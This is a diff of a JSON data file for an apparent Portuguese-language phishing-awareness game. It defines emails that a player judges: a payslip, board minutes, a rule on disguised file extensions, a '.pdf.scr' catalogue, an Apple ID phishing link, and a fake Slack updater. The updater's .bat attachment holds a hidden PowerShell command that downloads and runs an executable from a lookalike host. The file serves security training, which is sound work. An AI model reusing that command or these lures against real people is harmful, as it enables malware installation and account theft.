@@ -3,14 +3,14 @@
     "timeToReceive": 2,
     "mailBox": "User",
     "sender": "rh@nationaltech.com",
-    "subject": "Orientações do Dia 3 - Extensões Perigosas",
-    "body": "Bom trabalho ontem! Hoje veremos anexos camuflados. Um arquivo PDF é geralmente seguro, mas criminosos escondem executáveis (.exe, .bat, .scr) com ícones falsos. Analise as extensões!",
+    "subject": "Orientações do Dia 3 - Extensões Camufladas",
+    "body": "Bom trabalho ontem!\n\n<b>Regra nova:</b>\n- Masquerading (extensão camuflada): scripts (.bat, .cmd, .scr, .vbs, .js) executam comandos, assim como um .exe. Golpistas os escondem com nomes inofensivos. Confira sempre a ÚLTIMA extensão: \"catalogo.pdf.scr\" é um programa, não um PDF.\n\n<b>Cuidado com o exagero:</b> .pdf, .docx e .xlsx são documentos comuns e não quebram nenhuma regra sozinhos. Bloquear um documento legítimo também gera advertência.\n\nA regra está anexada e já está no Manual.\n\nRecursos Humanos - NationalTech",
     "attachments": [
       {
         "documentType": 0,
-        "name": "regra_extensoes_camufladas",
+        "name": "regra_masquerading",
         "extension": "manual",
-        "linkedName": "<link=\"OpenAttachment|1\">extensoes_camufladas.manual</link>",
+        "linkedName": "<link=\"OpenAttachment|1\">extensao_camuflada.manual</link>",
         "data": { "ruleId": "rule-attachment-disguised" }
       }
     ]
@@ -18,72 +18,90 @@
   {
     "timeToReceive": 20,
     "mailBox": "Company",
-    "sender": "financeiro@empresa.com.br",
+    "sender": "financeiro@nationaltech.com",
     "subject": "Seu Contracheque - Mês Atual",
     "body": "Olá! Segue em anexo o seu demonstrativo de pagamento referente ao mês trabalhado. Qualquer dúvida, entre em contato.",
     "attachments": [
       {
-        "documentType": 0,
+        "documentType": 2,
         "name": "contracheque_mes",
         "extension": "pdf",
         "linkedName": "<link=\"OpenAttachment|1\">contracheque_mes.pdf</link>",
-        "data": {}
+        "data": { "text": "<align=center><b>NATIONALTECH</b>\nDemonstrativo de Pagamento</align>\n\nColaborador: Analista de Segurança Digital\nMatrícula: 0147\n\n<b>Proventos</b>\nSalário base ......... R$ 4.200,00\nHoras extras ......... R$   380,00\n\n<b>Descontos</b>\nINSS ................. R$   378,00\nIRRF ................. R$   142,50\nPlano de saúde ....... R$    95,00\n\n<b>Líquido a receber ... R$ 3.964,50</b>\n\nDocumento gerado pelo sistema de folha.\nDúvidas: financeiro@nationaltech.com" }
       }
     ]
   },
   {
     "timeToReceive": 45,
     "mailBox": "Company",
-    "sender": "alertas@apple-id-security.com",
-    "subject": "Aviso: Seu iCloud foi bloqueado",
-    "body": "Seu Apple ID foi bloqueado por motivos de segurança. Para recuperar o acesso e evitar a exclusão dos dados, clique em <link=\"OpenURL|http://apple-suporte-br.xyz\">Desbloquear Conta</link>.",
-    "attachments": []
+    "sender": "compras@nationaltech.com",
+    "subject": "Catálogo do Novo Fornecedor",
+    "body": "Bom dia, equipe. Encaminho o catálogo que a distribuidora mandou, com a tabela de preços para o próximo trimestre. Deem uma olhada antes da reunião.",
+    "attachments": [
+      {
+        "documentType": 2,
+        "name": "catalogo_precos.pdf",
+        "extension": "scr",
+        "linkedName": "<link=\"OpenAttachment|1\">catalogo_precos.pdf.scr</link>",
+        "data": { "text": "<b>Pré-visualização indisponível</b>\n\nO arquivo catalogo_precos.pdf.scr não pode ser exibido como documento.\n\nTipo: Protetor de tela do Windows (.scr)\nTamanho: 864 KB\n\nConteúdo bruto:\nMZ..........@........\nThis program cannot be run in DOS mode.\n.text  .rdata  .data  .rsrc" }
+      }
+    ]
   },
   {
     "timeToReceive": 70,
     "mailBox": "Company",
-    "sender": "vendas@distribuidora-global.com",
-    "subject": "Catálogo de Produtos 2024",
-    "body": "Bom dia, equipe. Segue o nosso novo catálogo interativo com a tabela de preços atualizada para o próximo trimestre.",
-    "attachments": [
-      {
-        "documentType": 2,
-        "name": "catalogo_interativo",
-        "extension": "scr",
-        "linkedName": "<link=\"OpenAttachment|1\">catalogo_interativo.scr</link>",
-        "data": {}
-      }
-    ]
+    "sender": "alertas@apple-id-security.com",
+    "subject": "Aviso: Seu iCloud foi bloqueado",
+    "body": "Seu Apple ID foi bloqueado por motivos de segurança. Para recuperar o acesso e evitar a exclusão dos dados, acesse <link=\"OpenURL|http://apple-suporte-br.xyz/desbloquear\">http://apple-suporte-br.xyz/desbloquear</link>.",
+    "attachments": []
   },
   {
     "timeToReceive": 95,
     "mailBox": "Company",
     "sender": "admin@slack-update.io",
     "subject": "Sua conta do comunicador expirou",
-    "body": "O seu token de comunicação interna venceu. Baixe o atualizador automático para continuar recebendo mensagens dos seus colegas.",
+    "body": "O seu token de comunicação interna venceu. Execute o atualizador em anexo para continuar recebendo mensagens dos seus colegas.",
     "attachments": [
       {
         "documentType": 2,
-        "name": "slack_patch_v4",
-        "extension": "exe",
-        "linkedName": "<link=\"OpenAttachment|1\">slack_patch_v4.exe</link>",
-        "data": {}
+        "name": "atualizador_comunicador",
+        "extension": "bat",
+        "linkedName": "<link=\"OpenAttachment|1\">atualizador_comunicador.bat</link>",
+        "data": { "text": "@echo off\nREM Atualizador do comunicador v2.4\nREM Nao feche esta janela\npowershell -WindowStyle Hidden -Command \"Invoke-WebRequest http://slack-update.io/upd.exe -OutFile $env:TEMP\\upd.exe\"\nstart \"\" \"%TEMP%\\upd.exe\"\necho Atualizacao concluida.\npause" }
       }
     ]
   },
   {
     "timeToReceive": 125,
     "mailBox": "Company",
-    "sender": "juridico@empresa.com.br",
+    "sender": "juridico@nationaltech.com",
     "subject": "Ata da Reunião de Diretoria",
     "body": "Conforme solicitado, segue o documento com as pautas discutidas na reunião matinal para o seu arquivamento.",
     "attachments": [
       {
-        "documentType": 0,
+        "documentType": 2,
         "name": "ata_reuniao_04",
         "extension": "docx",
         "linkedName": "<link=\"OpenAttachment|1\">ata_reuniao_04.docx</link>",
-        "data": {}
+        "data": { "text": "<align=center><b>ATA DA REUNIÃO DE DIRETORIA Nº 04</b></align>\n\nData: segunda-feira, 9h\nLocal: Sala da Diretoria\nPresentes: Diretoria Executiva, Jurídico, Financeiro e TI\n\n<b>Assuntos discutidos</b>\n1. Aprovação do orçamento de treinamento em segurança.\n2. Contrato com a distribuidora para o próximo trimestre: em análise pelo Jurídico.\n3. Reforma das salas do 2º andar.\n\n<b>Encaminhamentos</b>\n- Financeiro envia a previsão de gastos até sexta.\n- TI apresenta o relatório de incidentes na próxima reunião.\n\nRedigida por: juridico@nationaltech.com" }
+      }
+    ]
+  },
+  {
+    "triggerId": "borges_rg_d3",
+    "mailBox": "User",
+    "sender": "ricardo.borges.nt@gmail.com",
+    "subject": "Meu RG",
+    "body": "Oi! Segue a foto do meu RG pra você liberar meu acesso. Valeu!",
+    "attachments": [
+      {
+        "documentType": 3,
+        "name": "rg_ricardo",
+        "extension": "png",
+        "linkedName": "<link=\"OpenAttachment|1\">rg_ricardo.png</link>",
+        "data": {
+          "imagePath": "rg_borges"
+        }
       }
     ]
   }
